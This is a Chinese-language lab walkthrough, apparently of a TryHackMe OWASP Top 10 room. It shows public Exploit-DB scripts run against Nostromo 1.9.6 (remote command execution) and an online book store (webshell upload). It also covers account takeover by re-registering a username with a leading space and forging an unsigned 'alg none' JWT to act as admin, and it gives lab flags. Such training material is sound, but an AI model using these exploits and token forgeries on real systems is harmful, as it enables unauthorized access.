<p>假设目标服务器具有Nostromo Web服务器的默认页面，现在我们有了目标应用程序的版本号和软件名称，就可以使用<a class="link"   href="https://www.exploit-db.com/" >exploit-db <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>来尝试找到这个特定版本的漏洞。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240108200916884.png"
                      alt="image-20240108200916884"
                ></p>
<blockquote>
<p>EXP链接：<a class="link"   href="https://www.exploit-db.com/exploits/47837" >https://www.exploit-db.com/exploits/47837 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<p>注意：exploit-db 非常有用，对于网络安全初学者来说，可能会经常使用它。</p>
<p>如上图所示，我们找到了一个相关的漏洞利用脚本，让我们下载它并尝试执行代码，然而单独运行这个脚本的结果并未如我们所愿，它会给出如下所示的报错信息。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">user@linux$ </span><span class="language-bash">python 47837.py</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;47837.py&quot;, line 10, in &lt;module&gt;</span><br><span class="line">    cve2019_16278.py</span><br><span class="line">NameError: name &#x27;cve2019_16278&#x27; is not defined</span><br></pre></td></tr></table></figure></div>

<p>有时候，初次执行exp可能不会成功生效，但是初次执行有助于我们了解脚本所使用的编程语言，以便在需要的时候，我们可以修复任何错误或进行任何修改，因为在Exploit-DB上的很多漏洞利用脚本都需要我们进行修改才能被成功执行。</p>
<p>幸运的是，本例中的exp执行错误是由本应被注释的代码行所引起的，因此我们很容易就能修复该exp，我们只需将以下代码行注释即可：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Exploit Title: nostromo 1.9.6 - Remote Code Execution</span></span><br><span class="line"><span class="comment"># Date: 2019-12-31</span></span><br><span class="line"><span class="comment"># Exploit Author: Kr0ff</span></span><br><span class="line"><span class="comment"># Vendor Homepage:</span></span><br><span class="line"><span class="comment"># Software Link: http://www.nazgul.ch/dev/nostromo-1.9.6.tar.gz</span></span><br><span class="line"><span class="comment"># Version: 1.9.6</span></span><br><span class="line"><span class="comment"># Tested on: Debian</span></span><br><span class="line"><span class="comment"># CVE : CVE-2019-16278</span></span><br><span class="line"></span><br><span class="line">cve2019_16278.py  <span class="comment"># This line needs to be commented. 注释这行代码</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br></pre></td></tr></table></figure></div>

<p>解决以上问题之后，让我们再次尝试运行exp：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">user@linux$ </span><span class="language-bash">python 47837.py 127.0.0.1 80 <span class="built_in">id</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                                        _____-2019-16278</span><br><span class="line">        _____  _______    ______   _____\    \</span><br><span class="line">   _____\    \_\      |  |      | /    / |    |</span><br><span class="line">  /     /|     ||     /  /     /|/    /  /___/|</span><br><span class="line"> /     / /____/||\    \  \    |/|    |__ |___|/</span><br><span class="line">|     | |____|/ \ \    \ |    | |       \</span><br><span class="line">|     |  _____   \|     \|    | |     __/ __</span><br><span class="line">|\     \|\    \   |\         /| |\    \  /  \</span><br><span class="line">| \_____\|    |   | \_______/ | | \____\/    |</span><br><span class="line">| |     /____/|    \ |     | /  | |    |____/|</span><br><span class="line"> \|_____|    ||     \|_____|/    \|____|   | |</span><br><span class="line">        |____|/                        |___|/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Fri, 03 Feb 2023 04:58:34 GMT</span><br><span class="line">Server: nostromo 1.9.6</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">uid=1001(_nostromo) gid=1001(_nostromo) groups=1001(_nostromo)</span><br></pre></td></tr></table></figure></div>

<p>我们成功执行了RCE，需要注意的是，大多数exp脚本只会告诉我们需要给它提供哪些参数以便完成漏洞利用过程，exp开发人员很少会让我们为了弄清楚如何使用脚本而去阅读数百行代码。</p>
<p>有时我们会很容易得到应用程序的版本号，但其他时候我们可能还需要深入挖掘HTML源代码，或者需要猜测一个能够被成功使用的漏洞利用脚本；如果目标应用程序的相关漏洞是一个已知漏洞，则总有办法可以尝试发现目标应用程序的当前版本信息。</p>
<h2 id="自带缺陷和过时的组件-操作实践"><a href="#自带缺陷和过时的组件-操作实践" class="headerlink" title="自带缺陷和过时的组件(操作实践)"></a>自带缺陷和过时的组件(操作实践)</h2><p>部署目标虚拟机，使用攻击机的浏览器导航到<code>http://MACHINE_IP:84</code>并尝试进行漏洞利用。</p>
<h3 id="答题-5"><a href="#答题-5" class="headerlink" title="答题"></a>答题</h3><p>首先在攻击机上使用浏览器访问<code>http://MACHINE_IP:84</code>(10.10.206.41:84)页面。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109225954149.png"
                      alt="image-20240109225954149"
                ></p>
<p>在 <a class="link"   href="https://www.exploit-db.com/" >https://www.exploit-db.com/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 中搜索目标应用程序(online book store)，并下载相关的EXP：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109230041674.png"
                      alt="image-20240109230041674"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109230118608.png"
                      alt="image-20240109230118608"
                ></p>
<p>在攻击机上使用exp，指定目标url参数：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">python <span class="number">47887.</span>py http://<span class="number">10.10</span><span class="number">.206</span><span class="number">.41</span>:<span class="number">84</span>/</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109230541087.png"
                      alt="image-20240109230541087"
                ></p>
<p>使用我们所获得的shell查看<code>/opt/flag.txt</code>文件内容：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109230636813.png"
                      alt="image-20240109230636813"
                ></p>
<p>tips：执行上述exp，会将一个php webshell文件上传到<code>http://10.10.206.41:84/bootstrap/img/</code>目录下。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109231058189.png"
                      alt="image-20240109231058189"
                ></p>
<blockquote>
<p>&#x2F;opt&#x2F;flag.txt的内容为：THM{But_1ts_n0t_my_f4ult!} 。</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109230722315.png"
                      alt="image-20240109230722315"
                ></p>
<h2 id="TOP7-身份识别和身份验证错误"><a href="#TOP7-身份识别和身份验证错误" class="headerlink" title="[TOP7]身份识别和身份验证错误"></a>[TOP7]身份识别和身份验证错误</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240108205910872.png"
                      alt="image-20240108205910872"
                ></p>
<p>身份验证和会话(session)管理构成了现代Web应用程序的核心组件。身份验证允许用户通过验证其身份来访问Web应用程序，最常见的身份验证形式是使用用户名和密码机制；用户需要输入密码凭据，然后服务器将验证它是否正确，如果用户所提供的凭据是正确的，那么服务器将向用户的本地浏览器提供一个会话cookie。之所以需要会话cookie，是因为Web服务器将使用无状态的HTTP(S)协议和客户端进行通信，通过附加会话cookie意味着服务器将知道是谁在发送什么数据，然后服务器就可以跟踪用户的操作。</p>
<p>如果攻击者能够发现身份验证机制中的缺陷，他们就可以成功访问其他用户所对应的帐户，这将允许攻击者能够访问某些敏感数据(取决于应用程序的目的)。身份验证机制中的一些常见缺陷包括：</p>
<ul>
<li>暴力破解攻击：如果Web应用程序使用用户名和密码作为身份验证机制，攻击者就可以尝试发起暴力破解攻击，该攻击将允许攻击者通过多次身份验证尝试来猜测有效的用户名和密码，一旦破解成功攻击者就能非法绕过身份验证机制。</li>
<li>使用弱凭据：Web应用程序应该设置强密码策略，如果应用程序允许用户设置诸如“password1”或其他常用密码之类的弱验证凭据，那么攻击者就能够轻松猜解出这些凭据并实现对用户帐户的访问。</li>
<li>弱会话Cookie：会话(Session)Cookie 是服务器跟踪用户操作的方式，如果会话cookie包含的是一些可预测的值，那么攻击者就可以伪造会话cookie并实现对用户帐户的访问。</li>
</ul>
<p>根据具体的身份验证机制缺陷，可以有多种针对损坏的身份验证机制的缓解措施：</p>
<ul>
<li>为了防御密码猜测攻击，请确保Web应用程序强制执行强密码策略。</li>
<li>为了防御暴力破解攻击，请确保Web应用程序在一定次数的失败验证尝试后，能够强制执行自动锁定，这将防止攻击者发起更多的暴力破解攻击尝试。</li>
<li>实施多因素身份验证措施，如果用户有多种身份验证方法，例如，在使用用户名和密码机制的同时还要求用户在绑定的移动设备上接收短信验证码，这样攻击者就很难同时提供两种凭据(密码、验证码)来访问目标用户的帐户。</li>
</ul>
<h2 id="身份识别和身份验证错误-操作实践"><a href="#身份识别和身份验证错误-操作实践" class="headerlink" title="身份识别和身份验证错误(操作实践)"></a>身份识别和身份验证错误(操作实践)</h2><p>本小节将通过一个示例来研究身份验证机制中的逻辑缺陷。</p>
<p>当开发人员忘记清理用户在Web应用程序代码中提供的输入(用户名和密码)时，可能会使目标Web应用程序容易受到SQL注入等攻击；但是，在此处我们将重点关注一个由于开发人员的错误而导致的逻辑缺陷，即：关于“已存在的用户”的重新注册问题。</p>
<p>例子：假设有一个名为”admin”的现有用户，现在我们想访问”admin”帐户，我们可以尝试对用户名稍作修改并重新注册用户名，进入用户名注册页面：在用户名字段中输入” admin”(注意此用户名开头含有空格)，然后接着输入其他必需信息(如电子邮件ID或密码等)并提交数据，该操作会注册一个新用户，但是该用户将拥有与普通管理员相同的权限，通过登录这个新用户我们就能看到”admin”用户权限所能访问的页面内容。</p>
<p>要查看实际效果，请访问<code>http://MACHINE_IP:8088</code>并尝试注册名为”darren”的用户，我们会看到一个提示”该用户已存在”，我们继续尝试注册名为” darren”的用户(注意此用户名开头含有空格)，注册完成之后进行登录操作，我们就能看到”darren”帐户中存在的内容。</p>
<h3 id="答题-6"><a href="#答题-6" class="headerlink" title="答题"></a>答题</h3><p>部署目标虚拟机，使用攻击机上的浏览器导航至<code>http://MACHINE_IP:8088</code>(10.10.206.41:8088)页面：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109231258782.png"
                      alt="image-20240109231258782"
                ></p>
<p>注册名为“ darren”的用户（注意此用户名开头含有空格），然后登录新用户帐户并查看flag内容：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109231421567.png"
                      alt="image-20240109231421567"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109231545945.png"
                      alt="image-20240109231545945"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109231559778.png"
                      alt="image-20240109231559778"
                ></p>
<blockquote>
<p>在darren用户帐户中找到的flag是：fe86079416a21a3c99937fea8874b667</p>
</blockquote>
<p>验证一下能否以同样的方式查看arthur用户帐户中的信息：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109231849658.png"
                      alt="image-20240109231849658"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109231955511.png"
                      alt="image-20240109231955511"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109232013123.png"
                      alt="image-20240109232013123"
                ></p>
<blockquote>
<p>在arthur用户帐户中找到的flag是：d9ac0f7db4fda460ac3edeb75d75e16e</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109232102814.png"
                      alt="image-20240109232102814"
                ></p>
<h2 id="TOP8-软件和数据完整性故障"><a href="#TOP8-软件和数据完整性故障" class="headerlink" title="[TOP8]软件和数据完整性故障"></a>[TOP8]软件和数据完整性故障</h2><p><strong>什么是完整性？</strong></p>
<p>当谈论到完整性时，我们指的是我们能够确定一段数据未被修改的能力。</p>
<p>完整性对于网络安全至关重要，因为我们需要维护重要数据免受不必要或恶意的修改，例如，假设我们正在下载某个软件的最新安装程序，那么我们应该思考一个问题——如何确定在下载该安装程序时它没有在传输过程中被修改或者因传输错误而被损坏？</p>
<p>为了解决刚才的问题，我们经常会看到与文件一起被发送的哈希值，该哈希值可以方便证明我们所下载的文件保持了完整性并且在传输过程中没有被修改。</p>
<p>tips：Hash是对一段数据应用特定的算法而产生的值，常见的哈希算法有MD5、SHA1、SHA256等。</p>
<p>让我们以WinSCP为例，以便更好地理解如何通过哈希值来检查文件的完整性。如果我们访问WinSCP的<a class="link"   href="https://sourceforge.net/projects/winscp/files/WinSCP/5.21.5/" >Sourceforge存储库 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，我们会看到对于每个可供下载的相关文件，存储库页面都会发布一些对应的hash值：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240108212635900.png"
                      alt="image-20240108212635900"
                ></p>
<p>这些哈希值是由WinSCP的创建者预先计算得到的，以便我们可以在完成下载后检查文件的完整性，如果我们下载了<code>WinSCP-5.21.5-Setup.exe</code>文件，我们就可以重新计算该文件的hash值并将其与WinSCP的Sourceforge存储库中所发布的哈希值进行比较，从而验证文件的完整性。</p>
<p>要在Linux中计算hash值，我们可以使用以下命令：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">user@attackbox$ </span><span class="language-bash"><span class="built_in">md5sum</span> WinSCP-5.21.5-Setup.exe</span>          </span><br><span class="line">20c5329d7fde522338f037a7fe8a84eb  WinSCP-5.21.5-Setup.exe</span><br><span class="line">                                                                                                                </span><br><span class="line"><span class="meta prompt_">user@attackbox$ </span><span class="language-bash"><span class="built_in">sha1sum</span> WinSCP-5.21.5-Setup.exe</span> </span><br><span class="line">c55a60799cfa24c1aeffcd2ca609776722e84f1b  WinSCP-5.21.5-Setup.exe</span><br><span class="line">                                                                                                                </span><br><span class="line"><span class="meta prompt_">user@attackbox$ </span><span class="language-bash"><span class="built_in">sha256sum</span> WinSCP-5.21.5-Setup.exe</span> </span><br><span class="line">e141e9a1a0094095d5e26077311418a01dac429e68d3ff07a734385eb0172bea  WinSCP-5.21.5-Setup.exe</span><br></pre></td></tr></table></figure></div>

<p>如果我们通过计算得到了相同的哈希值，那么我们就可以放心地得出结论：我们所下载的文件与应用程序发布页所提供的文件完全相同。</p>
<p><strong>软件和数据完整性故障</strong></p>
<p>此漏洞是因为用户在使用代码或基础设施时没有针对相关的软件或数据经过任何类型的完整性检查而引起的，由于没有进行完整性验证，攻击者就可能会修改软件或数据然后再传递给目标应用程序，从而导致难以预料的后果，该漏洞主要有两类：</p>
<ul>
<li>Software Integrity Failures：软件完整性故障；</li>
<li>Data Integrity Failures：数据完整性故障。</li>
</ul>
<h2 id="软件完整性故障"><a href="#软件完整性故障" class="headerlink" title="软件完整性故障"></a>软件完整性故障</h2><p><strong>概念介绍</strong></p>
<p>假设现在你有一个网站，该网站会使用第三方库，而这些库是存储在一些不受你控制的外部服务器中；虽然听起来很奇怪，但是这实际上是一种常见的做法。以常用的JavaScript库jQuery为例，如果需要的话，你可以直接从jQuery官方服务器将jQuery添加到你的网站中，而无需实际下载它，你只需在网站的HTML代码中添加以下行即可：</p>
<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://code.jquery.com/jquery-3.6.1.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>这样，当用户导航到你的网站时，用户的浏览器将读取网站的HTML代码并从指定的外部源加载JQuery。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109112709136.png"
                      alt="image-20240109112709136"
                ></p>
<p>现在的问题是，如果攻击者以某种方式侵入了jQuery官方存储库，那么他们就可以更改<code>https://code.jquery.com/jquery-3.6.1.min.js</code>的内容以注入恶意代码；这样，任何访问你的网站的用户都会在不知不觉中提取恶意代码并将其在本地浏览器中执行。这属于软件完整性故障，因为你的网站没有很好地检查第三方库以查看其是否被修改过。现在的浏览器允许你根据第三方库的URL来规定hash值，以便仅当已下载的库文件的哈希值与预定值相匹配时才执行库代码，这种安全机制被称为子资源完整性(SRI)，你可以在<a class="link"   href="https://www.srihash.org/" >SRI相关文档页 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>查看该机制的更多信息。</p>
<p>在HTML代码中插入第三方库的正确方法是使用SRI机制并且包含一个用于验证完整性的哈希，这样即使攻击者能够以某种方式修改库，任何浏览你网站的客户端也都不会执行被修改后的库文件。此时，网站的HTML代码中应具有如下内容：</p>
<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://code.jquery.com/jquery-3.6.1.min.js&quot;</span> <span class="attr">integrity</span>=<span class="string">&quot;sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=&quot;</span> <span class="attr">crossorigin</span>=<span class="string">&quot;anonymous&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>如果需要的话，你可以访问<code>https://www.srihash.org/</code>来为任何库生成对应的哈希值。</p>
<h3 id="答题-7"><a href="#答题-7" class="headerlink" title="答题"></a>答题</h3><p> <code>https://code.jquery.com/jquery-1.12.4.min.js</code>库文件的SHA-256哈希值是什么？</p>
<p>我们先访问：<a class="link"   href="https://www.srihash.org/" >https://www.srihash.org/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109115017277.png"
                      alt="image-20240109115017277"
                ></p>
<p>然后使用上述网站页面来计算 <code>https://code.jquery.com/jquery-1.12.4.min.js</code>库文件的SHA-256哈希：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109115124003.png"
                      alt="image-20240109115124003"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109115140530.png"
                      alt="image-20240109115140530"
                ></p>
<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://code.jquery.com/jquery-1.12.4.min.js&quot;</span> <span class="attr">integrity</span>=<span class="string">&quot;sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=&quot;</span> <span class="attr">crossorigin</span>=<span class="string">&quot;anonymous&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>最终我们得到的SHA-256哈希值为：<code>sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109115353736.png"
                      alt="image-20240109115353736"
                ></p>
<h2 id="数据完整性故障"><a href="#数据完整性故障" class="headerlink" title="数据完整性故障"></a>数据完整性故障</h2><p><strong>概念介绍</strong></p>
<p>首先，让我们考虑一下Web应用程序是如何维护会话的，通常，当用户登录到Web应用程序时，他们将被分配得到某种会话令牌，只要用户想让当前会话持续，就需要将这些令牌保存在他们的本地浏览器中。</p>
<p>会话令牌将在后继的每个请求中被重复使用，以便Web应用程序知道我们是谁。这些令牌可以有多种形式，但通常是通过cookies进行分配的；<strong>Cookies</strong>是Web应用程序将会存储在用户浏览器上的键值对，并且会在用户每次向Web站点发送请求时自动重复使用。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109131617787.png"
                      alt="image-20240109131617787"
                ></p>
<p>例如，如果你正在创建一个Web邮件应用程序，则可以在用户登录后为他们分配一个包含用户名的cookie，这样在后继请求中，用户的浏览器将始终通过cookie发送用户名，以便你的Web应用程序知道哪个用户正在请求连接；但是从安全的角度来看，这并不是一个很好的工作流程，由于cookie是存储在用户的浏览器上的，所以如果攻击者篡改cookie并修改用户名，那么他们就可能会冒充其他用户身份并阅读其他用户的电子邮件内容。我们可以说该应用程序存在数据完整性故障，因为它会信任“攻击者可篡改的数据”。</p>
<p>解决此类问题的一种方法是使用完整性检查机制来保证cookie没有被攻击者所更改，而JSON Web Tokens (JWT)就是这样的一种实现。</p>
<p>JWTs是一种非常简单的令牌，它在允许你存储键值对的同时还能提供相关的完整性检查，通过使用JWT，你可以生成令牌、向用户提供这些令牌，还能通过完整性检查确保攻击者无法更改令牌中的键值对。JWT令牌的结构由以下3部分组成：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109182145759.png"
                      alt="image-20240109182145759"
                ></p>
<p>如上图所示，令牌的标头部分会包含元数据以指示这是JWT并且使用的签名算法是HS256。令牌的Payload(有效载荷)部分会包含键值对以及Web应用程序希望浏览器客户端存储的数据。令牌的签名部分则类似于哈希值，可用于验证Payload的完整性，一旦你更改了令牌的Payload部分，那么Web应用程序就可以通过验证得知签名与Payload不匹配，从而得知你篡改了JWT。</p>
<p>与简单的哈希值不同，JWT令牌中的签名还涉及到使用仅由服务器持有的密钥，这意味着一旦攻击者更改了令牌的Payload部分，除非知道密钥，否则攻击者将无法生成相匹配的签名。</p>
<p>请注意，JWT令牌三部分中的每一部分都是使用Base64编码处理过的简单明文，你可以使用一些在线工具来编码&#x2F;解码Base64文本，例如我们可以尝试解码以下令牌中的标头、有效载荷、签名：</p>
<p><code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjY1MDc2ODM2fQ.C8Z3gJ7wPgVLvEUonaieJWBJBYt5xOph2CpIhlxqdUw</code></p>
<p>注意：JWT令牌中的签名包含了二进制数据，所以即使我们对其进行解码，也无法直接理解签名的含义。</p>
<p><strong>JWT和None算法</strong></p>
<p>某些实现JWT的库可能会存在“数据完整性故障”漏洞，正如我们上文所述，JWT实现了数字签名来验证令牌的Payload部分的数据完整性，而易受攻击的库允许攻击者通过更改JWT中的以下两项来绕过签名验证：</p>
<ol>
<li>修改令牌的标头部分，让标头中的<code>alg</code>值为<code>none</code>；</li>
<li>删除令牌中的签名部分。</li>
</ol>
<p>以我们上文所述的JWT为例，如果我们想更改JWT令牌的Payload部分(使用户名变为“admin”并且不做签名检查)，那么我们必须先解码令牌的标头、有效载荷，然后再根据需要修改它们，最后再进行重新编码处理。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109191841062.png"
                      alt="image-20240109191841062"
                ></p>
<h3 id="答题-8"><a href="#答题-8" class="headerlink" title="答题"></a>答题</h3><p>部署目标虚拟机，使用攻击机上的浏览器导航至<code>http://MACHINE_IP:8089</code>(10.10.206.41:8089)页面：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109232248145.png"
                      alt="image-20240109232248145"
                ></p>
<p>尝试使用guest用户和随机密码登录上面的应用程序：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109232454341.png"
                      alt="image-20240109232454341"
                ></p>
<blockquote>
<p>guest用户的默认密码为：guest</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109232833979.png"
                      alt="image-20240109232833979"
                ></p>
<p>现在我们能够以guest用户身份(使用密码guest)登录应用程序了，我们可以在本地浏览器中按F12调出开发者工具，以查看cookie的存储情况：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109232733123.png"
                      alt="image-20240109232733123"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109233014061.png"
                      alt="image-20240109233014061"
                ></p>
<blockquote>
<p>包含JWT令牌的网站cookie的名称是：jwt-session</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109233114622.png"
                      alt="image-20240109233114622"
                ></p>
<p>接下来，让我们尝试修改本地浏览器中的JWT令牌，以便让当前的Web应用程序以为我们是admin用户。</p>
<p>我们先复制并解码本地浏览器中的guest用户的JWT令牌值：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNzA0ODE2NjMyfQ.Kl3vgRZoIy8B9l4a6hc0te8QfGfr32m1NZNr1-7Wjnk</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">分别对令牌的标头和有效载荷部分进行<span class="built_in">base64</span>解码：</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">标头部分：eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">有效载荷部分：eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNzA0ODE2NjMyfQ</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">签名部分直接做删除处理即可。</span></span><br></pre></td></tr></table></figure></div>

<p>我们使用在线Base64编码&#x2F;解码工具进行操作：<a class="link"   href="https://appdevtools.com/base64-encoder-decoder" >https://appdevtools.com/base64-encoder-decoder <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109234124398.png"
                      alt="image-20240109234124398"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109234154717.png"
                      alt="image-20240109234154717"
                ></p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">head</span></span></span><br><span class="line">&#123;&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;HS256&quot;&#125;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">payload</span></span><br><span class="line">&#123;&quot;username&quot;:&quot;guest&quot;,&quot;exp&quot;:1704816632&#125;</span><br></pre></td></tr></table></figure></div>

<p>我们对上述解码后的令牌部分进行修改(将令牌标头中的<code>alg</code>值改为<code>none</code>，将令牌有效载荷中的<code>username</code>值改为<code>admin</code>)，然后再重新进行Base64编码处理。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">head</span></span></span><br><span class="line">&#123;&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;none&quot;&#125;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">payload</span></span><br><span class="line">&#123;&quot;username&quot;:&quot;admin&quot;,&quot;exp&quot;:1704816632&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109235134223.png"
                      alt="image-20240109235134223"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109235218556.png"
                      alt="image-20240109235218556"
                ></p>
<p>以点号为间隔，重新组合得到的新JWT令牌值如下所示：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzA0ODE2NjMyfQ==.</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">注意末尾也需要.号。</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">签名部分直接做了删除处理，所以新的JWT令牌现在没有签名部分。</span></span><br></pre></td></tr></table></figure></div>

<p>回到我们的本地浏览器界面，我们用新的JWT令牌替换之前的guest用户的JWT令牌值，然后我们刷新浏览器页面即可获取flag：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109235801281.png"
                      alt="image-20240109235801281"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109235848879.png"
                      alt="image-20240109235848879"
                ></p>
<blockquote>
<p>得到的flag为：THM{Dont_take_cookies_from_strangers} 。</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109235936626.png"
                      alt="image-20240109235936626"
                ></p>
